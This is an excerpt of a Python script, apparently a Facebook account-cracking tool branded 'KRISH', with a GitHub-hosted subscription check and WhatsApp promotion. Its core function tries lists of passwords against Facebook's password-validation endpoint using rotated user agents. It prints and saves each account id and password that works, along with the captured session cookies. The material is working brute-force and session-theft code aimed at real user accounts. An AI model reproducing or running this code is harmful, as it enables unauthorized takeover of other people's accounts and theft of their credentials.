...
os.system('clear')
slow_text_appear('[+]', '92;1')
slow_text_appear(' JOIN MY  GROUP', '92;1', delay=0.05)
...
time.sleep(6)
os.system(f'xdg-open https://github.com/shreekrish15')
print("")
print("")
...
princp=[]
url = 'https://github.com/shreekrish15/god/blob/main/krish.txt'
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/shreekrish15/god/blob/main/krish.txt').text
        ua=open('bbnew.txt','w')
...
def Subscraption():
    ...
    os.system('clear')
    print(logo)
    r1 = requests.get("https://github.com/shreekrish15/god/blob/main/krish.txt").text
    if id in r1:
        os.system('clear')
        print(logo)
    else:
        ...
        print("\033[1;39m[\033[1;32m●\033[1;39m]\033[1;33m KRISH TooLs Daily Update)✅ \033[0;92m")
        ...
        tks = f'https://wa.me/+9779769854260?text={message}'
...
def crackfree(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r{bo}[KRISH-M2] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;90m[KRISH-Cp] {idf} • {pw}')
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[0;92m[KRISH-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;96m{kuki} ')
                print('')
                os.system('espeak -a 300 " KRISH,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
